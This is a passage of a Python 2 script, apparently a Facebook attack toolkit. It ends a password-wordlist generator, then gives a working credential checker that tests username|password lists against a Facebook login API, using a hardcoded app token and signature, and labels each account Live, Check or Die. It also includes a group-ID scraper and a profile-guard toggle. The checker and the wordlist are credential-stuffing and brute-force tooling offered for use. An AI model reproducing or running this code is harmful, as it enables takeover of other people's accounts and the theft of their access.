		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except IOError, e:
		print("\033[1;91m[!] Failed")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()

##### CHECKER #####
def check_akun():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	cek = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			cek.append(password)
			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	lain()
	
##### GRUP SAYA #####
def grupsaya():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('reset')
	print logo
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			print "\033[1;97m[ \033[1;92mMyGroup\033[1;97m ] "+str(id)+" => "+str(nama)
		print 42*"\033[1;97m═"
		print"\033[1;91m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;91m[!] Group not found')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No Connection"
		keluar()
	except IOError:
		print "\033[1;91m[!] Error"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
		
##### PROFIL GUARD #####
def guard():
	global toket
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('reset')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
	if g == "1":
		aktif = "true"
		gaz(toket, aktif)
	elif g == "2":
		non = "false"
		gaz(toket, non)
	elif g =="0":
		lain()
	elif g =="":
		keluar()
	else:
		keluar()
	
def get_userid(toket):
	url = "https://graph.facebook.com/me?access_token=%s"%toket
	res = requests.get(url)
	uid = json.loads(res.text)
	return uid["id"]
		
def gaz(toket, enable = True):
	id = get_userid(toket)
	data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % (enable, str(id))
	headers = {"Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s" % toket}
	url = "https://graph.facebook.com/graphql"
	res = requests.post(url, data = data, headers = headers)
	print(res.text)
	if '"is_shielded":true' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mActivate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	elif '"is_shielded":false' in res.text:
		os.system('reset')
		print logo
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;91mNot activate"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	else:
		print "\033[1;91m[!] Error"
		keluar()
	
if __name__=='__main__':
        masuk()
